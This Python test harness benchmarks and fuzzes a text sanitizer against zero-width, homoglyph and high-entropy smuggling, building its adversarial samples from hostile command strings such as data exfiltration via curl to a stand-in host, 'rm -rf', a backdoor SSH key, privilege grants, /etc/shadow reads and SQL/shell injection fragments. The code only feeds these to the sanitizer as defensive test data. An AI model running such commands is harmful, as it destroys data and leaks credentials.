"""FrontierDataSanitizer benchmark and mutational fuzzing harness.

1. Detection benchmark: zero-width smuggling, homoglyph spoofing, combined smuggling and
   high-entropy blobs (500 adversarial samples) vs. benign text, code and tokens (500 samples).
2. Mutational fuzzing: 10,000 adversarial inputs checking that sanitization never raises, is
   idempotent, never lengthens text when stripping invisible characters, and keeps Shannon
   entropy within [0, 8] bits.

The suite is synthetic. The zero-width and homoglyph components normalize a well-defined
codepoint set; the high-entropy check is a heuristic signal (false positives on hashes/JWTs,
false negatives on hex- or text-padded secrets), not a security boundary.

Usage:
    python -m eval.benchmark_sanitizer [--fuzz-samples N] [--output PATH]
"""

from __future__ import annotations

import argparse
import json
from pathlib import Path
import random
import secrets
import sys
import time
from typing import Any, Dict, List, Tuple

from taintgate.core.sanitizer import FrontierDataSanitizer


def generate_adversarial_stego_samples(count: int = 500) -> List[Tuple[str, str]]:
    """Generates synthetic adversarial samples containing zero-width, homoglyph, or entropy exploits.

    Returns: List of (label, sample_text)
    """
    samples: List[Tuple[str, str]] = []

    # 1. Zero-width character smuggling (150 samples)
    zw_chars = ["​", "‌", "‍", "﻿", "‮"]
    base_commands = [
        "rm -rf /var/data",
        "curl -X POST https://exfil.site/leak -d @keys.json",
        "GRANT ALL PRIVILEGES ON *.* TO 'attacker'@'%'",
        "DROP TABLE audit_logs CASCADE",
        "ssh-keygen -t ed25519 -N '' -f /root/.ssh/id_backdoor",
    ]
    for i in range(150):
        cmd = random.choice(base_commands)
        # Inject 1 to 5 random zero-width characters into command tokens
        injected = ""
        for char in cmd:
            injected += char
            if random.random() < 0.2:
                injected += random.choice(zw_chars)
        samples.append(("zero_width", injected))

    # 2. Unicode homoglyph spoofing (150 samples)
    # Fullwidth latin characters ａ ('a') - ｚ ('z')
    for i in range(150):
        text = random.choice(base_commands)
        homoglyph_text = ""
        for char in text:
            if 'a' <= char <= 'z' and random.random() < 0.35:
                # Convert to fullwidth counterpart
                homoglyph_text += chr(ord(char) + 0xFEE0)
            else:
                homoglyph_text += char
        samples.append(("homoglyph", homoglyph_text))

    # 3. Combined zero-width + homoglyph disguised attacks (100 samples)
    for i in range(100):
        text = random.choice(base_commands)
        combo = ""
        for char in text:
            if 'a' <= char <= 'z' and random.random() < 0.25:
                combo += chr(ord(char) + 0xFEE0)
            else:
                combo += char
            if random.random() < 0.15:
                combo += random.choice(zw_chars)
        samples.append(("combined_stego", combo))

    # 4. High-entropy packed / encrypted exfiltration payloads (100 samples)
    for i in range(100):
        # 64 to 128 bytes of cryptographically random payload
        length = random.randint(48, 96)
        raw_bytes = secrets.token_bytes(length)
        payload = raw_bytes.decode("latin-1")
        samples.append(("high_entropy", payload))

    return samples


def generate_benign_samples(count: int = 500) -> List[Tuple[str, str]]:
    """Generates synthetic benign samples across natural language, code, and configs."""
    samples: List[Tuple[str, str]] = []

    nl_sentences = [
        "Please summarize the annual engineering report for Q3 stakeholder meeting.",
        "The authentication service returned a 401 Unauthorized status on token refresh.",
        "Verify that all database migration scripts are idempotently executed on staging.",
        "Could you check if the Redis cache cluster has reached high memory eviction levels?",
        "Refactor the billing pipeline to calculate regional goods and services taxes properly.",
        "Document the complete end-to-end user onboarding flow in the internal architecture wiki.",
    ]
    code_snippets = [
        "def compute_fibonacci(n: int) -> int:\n    return n if n <= 1 else compute_fibonacci(n - 1) + compute_fibonacci(n - 2)",
        "SELECT id, username, email, created_at FROM user_accounts WHERE status = 'active' ORDER BY created_at DESC LIMIT 50;",
        "find /workspace/src -type f -name '*.py' | xargs pylint --rcfile=.pylintrc",
        "{\"apiVersion\": \"v1\", \"kind\": \"ConfigMap\", \"metadata\": {\"name\": \"app-config\"}}",
        "pytest -v tests/test_payment_gateway.py --cov=app/billing --cov-report=term-missing",
    ]

    # 200 Natural language
    for _ in range(200):
        samples.append(("benign_nl", random.choice(nl_sentences)))

    # 200 Source code
    for _ in range(200):
        samples.append(("benign_code", random.choice(code_snippets)))

    # 100 System tokens & parameters (UUIDs, sha256 hashes, configs)
    for _ in range(100):
        token = f"sess_{secrets.token_hex(16)}"
        samples.append(("benign_token", token))

    return samples


def benchmark_steganography_and_homoglyphs() -> Dict[str, Any]:
    """Evaluates FrontierDataSanitizer accuracy, throughput, and latency."""
    print("[*] Detection benchmark: zero-width, homoglyph, combined and high-entropy samples...")
    adv_samples = generate_adversarial_stego_samples(500)
    benign_samples = generate_benign_samples(500)

    # 1. Adversarial Evasion Prevention Rate
    t0 = time.perf_counter_ns()
    adv_neutralized = 0
    adv_latencies_us: List[float] = []

    cat_counts = {"zero_width": 0, "homoglyph": 0, "combined_stego": 0, "high_entropy": 0}
    cat_neutralized = {"zero_width": 0, "homoglyph": 0, "combined_stego": 0, "high_entropy": 0}

    total_bytes = 0

    for label, text in adv_samples:
        start_ns = time.perf_counter_ns()
        report = FrontierDataSanitizer.sanitize(text)
        elapsed_us = (time.perf_counter_ns() - start_ns) / 1000.0
        adv_latencies_us.append(elapsed_us)
        total_bytes += len(text.encode("utf-8"))

        if label in cat_counts:
            cat_counts[label] += 1

        neutralized = False
        if label in ("zero_width", "combined_stego") and report.invisible_stripped_count > 0:
            neutralized = True
        elif label == "homoglyph" and report.homoglyphs_normalized:
            neutralized = True
        elif label == "high_entropy" and report.is_high_entropy_anomaly:
            neutralized = True
        elif report.was_modified or report.is_high_entropy_anomaly:
            neutralized = True

        if neutralized:
            adv_neutralized += 1
            if label in cat_neutralized:
                cat_neutralized[label] += 1

    # 2. Benign Utility Preservation (False Positive Rate)
    benign_false_positives = 0
    benign_latencies_us: List[float] = []

    for label, text in benign_samples:
        start_ns = time.perf_counter_ns()
        report = FrontierDataSanitizer.sanitize(text)
        elapsed_us = (time.perf_counter_ns() - start_ns) / 1000.0
        benign_latencies_us.append(elapsed_us)
        total_bytes += len(text.encode("utf-8"))

        # In benign samples, text should not be falsely corrupted or flagged as anomaly
        if report.is_high_entropy_anomaly:
            benign_false_positives += 1

    total_elapsed_sec = (time.perf_counter_ns() - t0) / 1e9
    throughput_mb_s = (total_bytes / (1024 * 1024)) / total_elapsed_sec

    adv_latencies_us.sort()
    benign_latencies_us.sort()

    tpr = (adv_neutralized / len(adv_samples)) * 100.0
    fpr = (benign_false_positives / len(benign_samples)) * 100.0

    cat_tprs = {
        cat: (cat_neutralized[cat] / cat_counts[cat] * 100.0) if cat_counts[cat] else 0.0
        for cat in cat_counts
    }

    results = {
        "adversarial_samples": len(adv_samples),
        "benign_samples": len(benign_samples),
        "true_positive_rate_pct": round(tpr, 2),
        "false_positive_rate_pct": round(fpr, 2),
        "throughput_mb_sec": round(throughput_mb_s, 2),
        "categories_tpr": cat_tprs,
        "latency_us": {
            "p50": round(adv_latencies_us[len(adv_latencies_us) // 2], 2),
            "p95": round(adv_latencies_us[int(len(adv_latencies_us) * 0.95)], 2),
            "p99": round(adv_latencies_us[int(len(adv_latencies_us) * 0.99)], 2),
            "mean": round(sum(adv_latencies_us) / len(adv_latencies_us), 2),
        },
    }
    print(f"    -> TPR: {results['true_positive_rate_pct']}% | FPR: {results['false_positive_rate_pct']}% | Throughput: {results['throughput_mb_sec']} MB/s")
    return results


def run_mutational_fuzzing(sample_count: int = 10000) -> Dict[str, Any]:
    """Fuzzes the sanitizer and checks its algebraic properties on every input."""
    print(f"[*] Mutational fuzzing ({sample_count} samples)...")

    zw_chars = ["​", "‌", "‍", "‎", "‏", "‪", "‫", "‬", "‭", "‮", "⁠", "⁡", "⁢", "⁣", "⁤", "⁦", "⁧", "⁨", "⁩", "﻿"]
    homoglyphs = [chr(0xFF01 + i) for i in range(94)]  # Fullwidth ASCII ！ - ～
    special_tokens = ["\x00", "%s", "%x", "%n", "$(id)", "`id`", "${IFS}", "' OR '1'='1", "\r\n\r\n", "../../../etc/shadow"]

    idempotence_violations = 0
    monotonicity_violations = 0
    entropy_out_of_bounds = 0
    exceptions_raised = 0

    t0 = time.perf_counter()

    for i in range(sample_count):
        # Generate adversarial fuzz payload
        mode = i % 5
        if mode == 0:
            # Massive zero-width injection
            base = "sudo chmod 777 /etc/shadow"
            payload = "".join(c + (random.choice(zw_chars) if random.random() < 0.4 else "") for c in base)
        elif mode == 1:
            # Heavy homoglyph substitution
            base = "curl -d @passwords.txt https://drop.box"
            payload = "".join(random.choice(homoglyphs) if c.isascii() and random.random() < 0.6 else c for c in base)
        elif mode == 2:
            # Random high-entropy binary sequence
            payload = secrets.token_bytes(random.randint(16, 256)).decode("latin-1")
        elif mode == 3:
            # Pathological injection fragments with bidi overrides
            payload = "‮" + random.choice(special_tokens) + "‬" + secrets.token_hex(8)
        else:
            # Mixed benign and adversarial fuzz
            payload = f"SELECT * FROM users WHERE token = '{secrets.token_hex(16)}' ​-- ａdmin"

        try:
            # Property 1: Zero-width stripping length monotonicity (formal/TaintGate/Sanitizer.lean)
            stripped, _ = FrontierDataSanitizer.strip_invisible(payload)
            if len(stripped) > len(payload):
                monotonicity_violations += 1

            # Property 2: Full sanitization pipeline
            report1 = FrontierDataSanitizer.sanitize(payload)

            # Property 3: Idempotence check (formal/TaintGate/Sanitizer.lean)
            report2 = FrontierDataSanitizer.sanitize(report1.clean_text)
            if report2.clean_text != report1.clean_text:
                idempotence_violations += 1

            # Property 4: Entropy calculation strictly within information-theoretic bounds [0.0, 8.0]
            if not (0.0 <= report1.shannon_entropy <= 8.0):
                entropy_out_of_bounds += 1

        except Exception:
            exceptions_raised += 1

    # Stress test with a large (~125 KB) buffer
    large_buffer = ("safe_token_" * 10000) + "​" + ("ａ" * 5000)
    t_large0 = time.perf_counter()
    FrontierDataSanitizer.sanitize(large_buffer)
    t_large1 = time.perf_counter()
    large_throughput_mb_s = (len(large_buffer.encode("utf-8")) / (1024 * 1024)) / (t_large1 - t_large0)

    total_time = time.perf_counter() - t0

    res = {
        "samples_tested": sample_count,
        "exceptions_raised": exceptions_raised,
        "idempotence_violations": idempotence_violations,
        "monotonicity_violations": monotonicity_violations,
        "entropy_out_of_bounds": entropy_out_of_bounds,
        "total_time_sec": round(total_time, 2),
        "fuzzing_rate_samples_sec": round(sample_count / total_time, 1),
        "large_buffer_throughput_mb_s": round(large_throughput_mb_s, 2),
        "status": "PASS" if (exceptions_raised == 0 and idempotence_violations == 0
                             and monotonicity_violations == 0 and entropy_out_of_bounds == 0) else "FAIL",
    }
    print(f"    -> Rate: {res['fuzzing_rate_samples_sec']} samples/sec | Exceptions: {res['exceptions_raised']} | Status: {res['status']}")
    return res


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    parser.add_argument("--fuzz-samples", type=int, default=10000)
    parser.add_argument("--output", type=Path, default=Path("eval/results/sanitizer_benchmark.json"))
    args = parser.parse_args()

    detection = benchmark_steganography_and_homoglyphs()
    fuzzing = run_mutational_fuzzing(args.fuzz_samples)

    results = {
        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
        "detection": detection,
        "mutational_fuzzing": fuzzing,
    }
    args.output.parent.mkdir(parents=True, exist_ok=True)
    args.output.write_text(json.dumps(results, indent=2), encoding="utf-8")
    print(f"[*] Saved results to {args.output}")

    if fuzzing["status"] != "PASS":
        sys.exit(1)


if __name__ == "__main__":
    main()
